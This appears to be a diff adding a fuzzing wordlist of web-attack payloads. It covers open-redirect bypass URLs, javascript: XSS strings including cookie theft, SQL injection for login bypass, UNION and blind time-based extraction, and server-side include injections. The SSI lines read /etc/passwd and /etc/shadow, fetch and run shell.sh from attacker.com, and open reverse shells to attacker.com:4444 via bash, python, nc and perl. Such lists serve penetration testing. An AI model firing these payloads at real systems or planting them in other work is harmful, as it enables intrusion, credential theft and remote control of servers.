+//https://google.com/%2e%2e%2f
+https://google.com/%2e%2e%2f
+/https://google.com/%2f..
+https://google.com/%2f..
+/https:///google.com/%2f%2e%2e
+/https://google.com/%2f%2e%2e
+https:///google.com/%2f%2e%2e
+https://google.com/%2f%2e%2e
+https://:@google.com\@example.com
+https://:@google.com\@www.whitelisteddomain.tld
+//https://localdomain.pw//
+/https://localdomain.pw/
+https://localdomain.pw
+https://localdomain.pw/
+https://localdomain.pw//
+https:localdomain.pw
+//https:///localdomain.pw/%2e%2e
+/https://localdomain.pw/%2e%2e
+https:///localdomain.pw/%2e%2e
+//https://localdomain.pw/%2e%2e%2f
+https://localdomain.pw/%2e%2e%2f
+/https://localdomain.pw/%2f..
+https://localdomain.pw/%2f..
+/https:///localdomain.pw/%2f%2e%2e
+/https://localdomain.pw/%2f%2e%2e
+https:///localdomain.pw/%2f%2e%2e
+https://localdomain.pw/%2f%2e%2e
+https://:@localdomain.pw\@www.whitelisteddomain.tld
+//https:///www.google.com/%2e%2e
+/https://www.google.com/%2e%2e
+https:///www.google.com/%2e%2e
+//https://www.google.com/%2e%2e%2f
+https://www.google.com/%2e%2e%2f
+/https:///www.google.com/%2f%2e%2e
+/https://www.google.com/%2f%2e%2e
+https:///www.google.com/%2f%2e%2e
+https://www.google.com/%2f%2e%2e
+//https://www.whitelisteddomain.tld@google.com//
+/https://www.whitelisteddomain.tld@google.com/
+https://www.whitelisteddomain.tld@google.com
+https://www.whitelisteddomain.tld@google.com/
+https://www.whitelisteddomain.tld@google.com//
+/https://www.whitelisteddomain.tld@google.com/%2f..
+https://www.whitelisteddomain.tld@google.com/%2f..
+https://www.whitelisteddomain.tld/https://localdomain.pw/
+https://www.whitelisteddomain.tld/https://www.google.com/
+//https://www.whitelisteddomain.tld@localdomain.pw//
+/https://www.whitelisteddomain.tld@localdomain.pw/
+https://www.whitelisteddomain.tld@localdomain.pw
+https://www.whitelisteddomain.tld@localdomain.pw/
+https://www.whitelisteddomain.tld@localdomain.pw//
+/https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e
+https:///www.whitelisteddomain.tld@localdomain.pw/%2e%2e
+//https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
+https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
+/https://www.whitelisteddomain.tld@localdomain.pw/%2f..
+https://www.whitelisteddomain.tld@localdomain.pw/%2f..
+/https:///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+/https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+https:///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+/https://www.whitelisteddomain.tld@www.google.com/%2e%2e
+https:///www.whitelisteddomain.tld@www.google.com/%2e%2e
+//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+http://www.localdomain.pw\.www.whitelisteddomain.tld
+http://www.whitelisteddomain.tld@00330.00072.0000326.00000316
+http:www.whitelisteddomain.tld@00330.00072.0000326.00000316
+http://www.whitelisteddomain.tld@00330.0x3a.54990
+http:www.whitelisteddomain.tld@00330.0x3a.54990
+http://www.whitelisteddomain.tld@00330.3856078
+http:www.whitelisteddomain.tld@00330.3856078
+http://www.whitelisteddomain.tld@0330.072.0326.0316
+http:www.whitelisteddomain.tld@0330.072.0326.0316
+http://www.whitelisteddomain.tld@0xd8.072.54990
+http:www.whitelisteddomain.tld@0xd8.072.54990
+http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
+http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
+http://www.whitelisteddomain.tld@0xd8.3856078
+http:www.whitelisteddomain.tld@0xd8.3856078
+http://www.whitelisteddomain.tld@0xd83ad6ce
+http:www.whitelisteddomain.tld@0xd83ad6ce
+http://www.whitelisteddomain.tld@[::216.58.214.206]
+http:www.whitelisteddomain.tld@[::216.58.214.206]
+http://www.whitelisteddomain.tld%2elocaldomain.pw/
+http://www.whitelisteddomain.tld@3627734734
+http:www.whitelisteddomain.tld@3627734734
+http://www.whitelisteddomain.tld@472.314.470.462
+http:www.whitelisteddomain.tld@472.314.470.462
+http://www.whitelisteddomain.tld:80%40localdomain.pw/
+http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]
+http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]
+http://www.whitelisteddomain.tld+&@localdomain.pw#+@www.whitelisteddomain.tld/
+http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http://XY>.7d8T\205pZM@00330.0x3a.54990
+http:XY>.7d8T\205pZM@00330.0x3a.54990
+http://XY>.7d8T\205pZM@00330.3856078
+http:XY>.7d8T\205pZM@00330.3856078
+http://XY>.7d8T\205pZM@0330.072.0326.0316
+http:XY>.7d8T\205pZM@0330.072.0326.0316
+http://XY>.7d8T\205pZM@0xd8.072.54990
+http:XY>.7d8T\205pZM@0xd8.072.54990
+http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http://XY>.7d8T\205pZM@0xd8.3856078
+http:XY>.7d8T\205pZM@0xd8.3856078
+http://XY>.7d8T\205pZM@0xd83ad6ce
+http:XY>.7d8T\205pZM@0xd83ad6ce
+http://XY>.7d8T\205pZM@[::216.58.214.206]
+http:XY>.7d8T\205pZM@[::216.58.214.206]
+http://XY>.7d8T\205pZM@3627734734
+http:XY>.7d8T\205pZM@3627734734
+http://XY>.7d8T\205pZM@472.314.470.462
+http:XY>.7d8T\205pZM@472.314.470.462
+http://XY>.7d8T\205pZM@example.com+@google.com/
+http://XY>.7d8T\205pZM@example.com@google.com/
+http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http://XY>.7d8T\205pZM@www.whitelisteddomain.tld+@localdomain.pw/
+http://XY>.7d8T\205pZM@www.whitelisteddomain.tld@localdomain.pw/
+ja\nva\tscript\r:alert(1)
+java%09script:alert(1)
+java%0ascript:alert(1)
+java%0d%0ascript%0d%0a:alert(0)
+java%0dscript:alert(1)
+Javas%26%2399;ript:alert(1)
+javascript://%0aalert(1)
+//javascript:alert(1)
+//javascript:alert(1);
+/javascript:alert(1)
+/javascript:alert(1);
+<>javascript:alert(1);
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+javascript:alert(1)
+javascript:alert(1);
+javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
+javascript://example.com?%a0alert%281%29
+javascript://https://example.com/?z=%0Aalert(1)
+javascript://https://www.whitelisteddomain.tld/?z=%0Aalert(1)
+jaVAscript://www.whitelisteddomain.tld//%0d%0aalert(1);//
+javascript://www.whitelisteddomain.tld?%a0alert%281%29
+//localdomain%00.pw
+//localdomain%E3%80%82pw
+.localdomain.pw
+/.localdomain.pw
+/////localdomain.pw
+/////localdomain.pw/
+////localdomain.pw/
+////localdomain.pw//
+///\;@localdomain.pw
+///localdomain.pw
+///localdomain.pw/
+///localdomain.pw//
+//;@localdomain.pw
+//localdomain.pw
+//localdomain.pw/
+//localdomain.pw//
+/\/localdomain.pw/
+<>//localdomain.pw
+@localdomain.pw
+\/\/localdomain.pw/
+////localdomain.pw/%2e%2e
+///localdomain.pw/%2e%2e
+////localdomain.pw/%2e%2e%2f
+///localdomain.pw/%2e%2e%2f
+//localdomain.pw/%2e%2e%2f
+////localdomain.pw/%2f..
+///localdomain.pw/%2f..
+//localdomain.pw/%2f..
+////localdomain.pw/%2f%2e%2e
+///localdomain.pw/%2f%2e%2e
+//localdomain.pw/%2f%2e%2e
+/localdomain.pw/%2f%2e%2e
+//localdomain.pw:80#@www.whitelisteddomain.tld/
+//localdomain.pw:80?@www.whitelisteddomain.tld/
+//localdomain.pw\twww.whitelisteddomain.tld/
+//localdomain.pw\@www.whitelisteddomain.tld
+/ReceiveAutoRedirect/false?desiredLocationUrl=http://xssposed.org
+/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
+/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com&redirect_uri=/\/example.com
+/redirect?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redirect_uri=/\/example.com
+/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
+/?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
+////www.google.com/%2e%2e
+///www.google.com/%2e%2e
+////www.google.com/%2e%2e%2f
+///www.google.com/%2e%2e%2f
+//www.google.com/%2e%2e%2f
+////www.google.com/%2f%2e%2e
+///www.google.com/%2f%2e%2e
+//www.google.com/%2f%2e%2e
+////www.whitelisteddomain.tld@google.com/
+////www.whitelisteddomain.tld@google.com//
+///www.whitelisteddomain.tld@google.com/
+///www.whitelisteddomain.tld@google.com//
+//www.whitelisteddomain.tld@google.com/
+//www.whitelisteddomain.tld@google.com//
+////www.whitelisteddomain.tld@google.com/%2f..
+///www.whitelisteddomain.tld@google.com/%2f..
+//www.whitelisteddomain.tld@google.com/%2f..
+//www.whitelisteddomain.tld@https:///localdomain.pw/%2e%2e
+//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e
+////www.whitelisteddomain.tld@localdomain.pw/
+////www.whitelisteddomain.tld@localdomain.pw//
+///www.whitelisteddomain.tld@localdomain.pw/
+///www.whitelisteddomain.tld@localdomain.pw//
+//www.whitelisteddomain.tld@localdomain.pw/
+//www.whitelisteddomain.tld@localdomain.pw//
+////www.whitelisteddomain.tld@localdomain.pw/%2e%2e
+///www.whitelisteddomain.tld@localdomain.pw/%2e%2e
+////www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
+///www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
+//www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
+////www.whitelisteddomain.tld@localdomain.pw/%2f..
+///www.whitelisteddomain.tld@localdomain.pw/%2f..
+//www.whitelisteddomain.tld@localdomain.pw/%2f..
+////www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+//www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+//www.whitelisteddomain.tld+&@localdomain.pw#+@www.whitelisteddomain.tld/
+////www.whitelisteddomain.tld@www.google.com/%2e%2e
+///www.whitelisteddomain.tld@www.google.com/%2e%2e
+////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/x:1/:///%01javascript:alert(document.cookie)/
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+//XY>.7d8T\205pZM@example.com+@google.com/
+//XY>.7d8T\205pZM@example.com@google.com/
+//XY>.7d8T\205pZM@www.whitelisteddomain.tld+@localdomain.pw/
+//XY>.7d8T\205pZM@www.whitelisteddomain.tld@localdomain.pw/
+0' or '0' = '0
+1' or '1' = '1
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+' OORR 1<2 #
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+' and 1='1
+' and a='a
+ or 1=1
+ or true
+' or ''='
+" or ""="
+1′) and '1′='1–
+' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
+" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
+ and 1=1
+ and 1=1–
+' and 'one'='one
+' and 'one'='one–
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+ like '%'
+ or 0=0 --
+ or 0=0 #
+ or 0=0 –
+' or         0=0 #
+' or 0=0 --
+' or 0=0 #
+' or 0=0 –
+" or 0=0 --
+" or 0=0 #
+" or 0=0 –
+%' or '0'='0
+ or 1=1
+ or 1=1--
+ or 1=1/*
+ or 1=1#
+ or 1=1–
+' or 1=1--
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'/*
+' or '1'='1'#
+' or '1′='1
+' or 1=1
+' or 1=1 --
+' or 1=1 –
+' or 1=1--
+' or 1=1;#
+' or 1=1/*
+' or 1=1#
+' or 1=1–
+') or '1'='1
+') or '1'='1--
+') or '1'='1'--
+') or '1'='1'/*
+') or '1'='1'#
+') or ('1'='1
+') or ('1'='1--
+') or ('1'='1'--
+') or ('1'='1'/*
+') or ('1'='1'#
+'or'1=1
+'or'1=1′
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 –
+" or 1=1--
+" or 1=1/*
+" or 1=1#
+" or 1=1–
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+) or '1′='1–
+) or ('1′='1–
+' or 1=1 LIMIT 1;#
+'or 1=1 or ''='
+"or 1=1 or ""="
+' or 'a'='a
+' or a=a--
+' or a=a–
+') or ('a'='a
+" or "a"="a
+") or ("a"="a
+') or ('a'='a and hi") or ("a"="a
+' or 'one'='one
+' or 'one'='one–
+' or uid like '%
+' or uname like '%
+' or userid like '%
+' or user like '%
+' or username like '%
+' or 'x'='x
+') or ('x'='x
+" or "x"="x
+' OR 'x'='x'#;
+'=' 'or' and '=' 'or'
+' UNION ALL SELECT 1, @@version;#
+' UNION ALL SELECT system_user(),user();#
+' UNION select table_schema,table_name FROM information_Schema.tables;#
+admin' and substring(password/text(),1,1)='7
+' and substring(password/text(),1,1)='7
+' or 1=1 limit 1 -- -+
+'="or'
+' and 'x'='x
+admin' or 1=1;-- 
+?id=1' order by 1 --+
+?id=1' and "a"="a"--+
+?id=1' and database()="securtiy"--+
+?id=1' and substring(database(),1,1)="a"--+
+?id=1' and sleep(2) and "a"="a"--+
+?id=1' and sleep(2) and substring(database(),1,1)="a"--+
+'+||+1=1#
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or "
+-- or # 
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+%00
+/*…*/ 
++       addition, concatenate (or space in url)
+||      (double pipe) concatenate
+%       wildcard attribute indicator
+@variable   local variable
+@@variable  global variable
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+-2
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+' GROUP BY columnnames having 1=1 --
+-1' UNION SELECT 1,2,3--+
+' UNION SELECT sum(columnname ) from tablename --
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+1 AND (SELECT * FROM Users) = 1 
+' AND MID(VERSION(),1,1) = '5';
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+';WAITFOR DELAY '0:0:30'--
+ OR 1=1
+ OR 1=0
+ OR x=x
+ OR x=y
+ OR 1=1#
+ OR 1=0#
+ OR x=x#
+ OR x=y#
+ OR 1=1-- 
+ OR 1=0-- 
+ OR x=x-- 
+ OR x=y-- 
+ OR 3409=3409 AND ('pytW' LIKE 'pytW
+ OR 3409=3409 AND ('pytW' LIKE 'pytY
+ HAVING 1=1
+ HAVING 1=0
+ HAVING 1=1#
+ HAVING 1=0#
+ HAVING 1=1-- 
+ HAVING 1=0-- 
+ AND 1=1
+ AND 1=0
+ AND 1=1-- 
+ AND 1=0-- 
+ AND 1=1#
+ AND 1=0#
+ AND 1=1 AND '%'='
+ AND 1=0 AND '%'='
+ AND 1083=1083 AND (1427=1427
+ AND 7506=9091 AND (5913=5913
+ AND 1083=1083 AND ('1427=1427
+ AND 7506=9091 AND ('5913=5913
+ AND 7300=7300 AND 'pKlZ'='pKlZ
+ AND 7300=7300 AND 'pKlZ'='pKlY
+ AND 7300=7300 AND ('pKlZ'='pKlZ
+ AND 7300=7300 AND ('pKlZ'='pKlY
+ AS INJECTX WHERE 1=1 AND 1=1
+ AS INJECTX WHERE 1=1 AND 1=0
+ AS INJECTX WHERE 1=1 AND 1=1#
+ AS INJECTX WHERE 1=1 AND 1=0#
+ AS INJECTX WHERE 1=1 AND 1=1--
+ AS INJECTX WHERE 1=1 AND 1=0--
+ WHERE 1=1 AND 1=1
+ WHERE 1=1 AND 1=0
+ WHERE 1=1 AND 1=1#
+ WHERE 1=1 AND 1=0#
+ WHERE 1=1 AND 1=1--
+ WHERE 1=1 AND 1=0--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+ ORDER BY 1-- 
+ ORDER BY 2-- 
+ ORDER BY 3-- 
+ ORDER BY 4-- 
+ ORDER BY 5-- 
+ ORDER BY 6-- 
+ ORDER BY 7-- 
+ ORDER BY 8-- 
+ ORDER BY 9-- 
+ ORDER BY 10-- 
+ ORDER BY 11-- 
+ ORDER BY 12-- 
+ ORDER BY 13-- 
+ ORDER BY 14-- 
+ ORDER BY 15-- 
+ ORDER BY 16-- 
+ ORDER BY 17-- 
+ ORDER BY 18-- 
+ ORDER BY 19-- 
+ ORDER BY 20-- 
+ ORDER BY 21-- 
+ ORDER BY 22-- 
+ ORDER BY 23-- 
+ ORDER BY 24-- 
+ ORDER BY 25-- 
+ ORDER BY 26-- 
+ ORDER BY 27-- 
+ ORDER BY 28-- 
+ ORDER BY 29-- 
+ ORDER BY 30-- 
+ ORDER BY 31337-- 
+ ORDER BY 1# 
+ ORDER BY 2# 
+ ORDER BY 3# 
+ ORDER BY 4# 
+ ORDER BY 5# 
+ ORDER BY 6# 
+ ORDER BY 7# 
+ ORDER BY 8# 
+ ORDER BY 9# 
+ ORDER BY 10# 
+ ORDER BY 11# 
+ ORDER BY 12# 
+ ORDER BY 13# 
+ ORDER BY 14# 
+ ORDER BY 15# 
+ ORDER BY 16# 
+ ORDER BY 17# 
+ ORDER BY 18# 
+ ORDER BY 19# 
+ ORDER BY 20# 
+ ORDER BY 21# 
+ ORDER BY 22# 
+ ORDER BY 23# 
+ ORDER BY 24# 
+ ORDER BY 25# 
+ ORDER BY 26# 
+ ORDER BY 27# 
+ ORDER BY 28# 
+ ORDER BY 29# 
+ ORDER BY 30#
+ ORDER BY 31337#
+ ORDER BY 1 
+ ORDER BY 2 
+ ORDER BY 3 
+ ORDER BY 4 
+ ORDER BY 5 
+ ORDER BY 6 
+ ORDER BY 7 
+ ORDER BY 8 
+ ORDER BY 9 
+ ORDER BY 10 
+ ORDER BY 11 
+ ORDER BY 12 
+ ORDER BY 13 
+ ORDER BY 14 
+ ORDER BY 15 
+ ORDER BY 16 
+ ORDER BY 17 
+ ORDER BY 18 
+ ORDER BY 19 
+ ORDER BY 20 
+ ORDER BY 21 
+ ORDER BY 22 
+ ORDER BY 23 
+ ORDER BY 24 
+ ORDER BY 25 
+ ORDER BY 26 
+ ORDER BY 27 
+ ORDER BY 28 
+ ORDER BY 29 
+ ORDER BY 30 
+ ORDER BY 31337 
+ RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+ RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+%' AND 8310=8310 AND '%'='
+%' AND 8310=8311 AND '%'='
+ and (select substring(@@version,1,1))='X'
+ and (select substring(@@version,1,1))='M'
+ and (select substring(@@version,2,1))='i'
+ and (select substring(@@version,2,1))='y'
+ and (select substring(@@version,3,1))='c'
+ and (select substring(@@version,3,1))='S'
+ and (select substring(@@version,3,1))='X'
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+'\"
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
++ SLEEP(10) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+'|| pg_sleep(10) --+
+'=' 'or' and '=' 'or'
+' UNION ALL SELECT 1, @@version;#
+' UNION ALL SELECT system_user(),user();#
+' UNION select table_schema,table_name FROM information_Schema.tables;#
+admin' and substring(password/text(),1,1)='7
+' and substring(password/text(),1,1)='7
+' or 1=1 limit 1 -- -+
+'="or'
+' and 'x'='x
+admin' or 1=1;-- 
+?id=1' order by 1 --+
+?id=1' and "a"="a"--+
+?id=1' and database()="securtiy"--+
+?id=1' and substring(database(),1,1)="a"--+
+?id=1' and sleep(2) and "a"="a"--+
+?id=1' and sleep(2) and substring(database(),1,1)="a"--+
+'+||+1=1#
+')waitfor delay'0:0:10'--
+(select(0)from(select(sleep(10)))v)
+(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)
+%2b(select*from(select(sleep(10)))a)%2b
+
+<!--#echo var="DATE_LOCAL" -->
+<!--#flastmod file="index.html" -->
+<!--#include virtual="/cgi-bin/counter.pl" -->
+<!--#include virtual="/footer.html" -->
+<!--#exec cmd="ls" -->
+<!--#set var="name" value="Rich" -->
+<!--#include virtual="file_to_include.html" -->
+<!--#include file="file_to_include.html" -->
+<!--#printenv -->
+<!--#echo var="DOCUMENT_NAME"-->
+<!--#echo var="HTTP_USER_AGENT"-->
+<!--#echo var="QUERY_STRING"-->
+<!--#echo var="DATE_LOCAL"-->
+<!--#echo var="DATE_GMT"-->
+<!--#echo var="DOCUMENT_URI"-->
+<!--#echo var="LAST_MODIFIED"-->
+<!--#include file="/etc/passwd"-->
+<!--#include file="../etc/passwd"-->
+<!--#include virtual="/etc/passwd"-->
+<!--#include virtual="/proc/self/environ"-->
+<!--#include virtual="../etc/shadow"-->
+<!--#exec cmd="id"-->
+<!--#exec cmd="whoami"-->
+<!--#exec cmd="uname -a"-->
+<!--#exec cmd="ls -la /"-->
+<!--#exec cmd="cat /etc/passwd"-->
+<!--#exec cmd="cat /proc/version"-->
+<!--#exec cmd="curl http://attacker.com"-->
+<!--#exec cmd="wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh"-->
+<!--#exec cmd="ping -c 1 attacker.com"-->
+<!--#exec cmd="nslookup attacker.com"-->
+<!--#exec cmd="dig attacker.com"-->
+<!--#exec cmd="curl http://attacker.com/$(whoami)"-->
+<%@ include file="/etc/passwd" %>
+<%#exec cmd="id"%>
+<!--#exec%20cmd="id"-->
+<!--#echo%20var="DOCUMENT_NAME"-->
+<!--#include%20file="/etc/passwd"-->
+<!--#include%09file="/etc/passwd"-->
+<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"-->
+<!--#exec cmd="/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"-->
+<!--#exec cmd="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"]);'"-->
+<!--#exec cmd="nc attacker.com 4444 -e /bin/sh"-->
+<!--#exec cmd="perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">\&S\");open(STDOUT,\">\&S\");open(STDERR,\">\&S\");exec(\"/bin/sh -i\");};'"-->
+http://127.0.0.1/index
+http://127.0.0.1/index.html
+C:\inetpub\wwwroot\iisstart.png
+file:///C:/inetpub/wwwroot/iisstart.png
+127。0。0。1
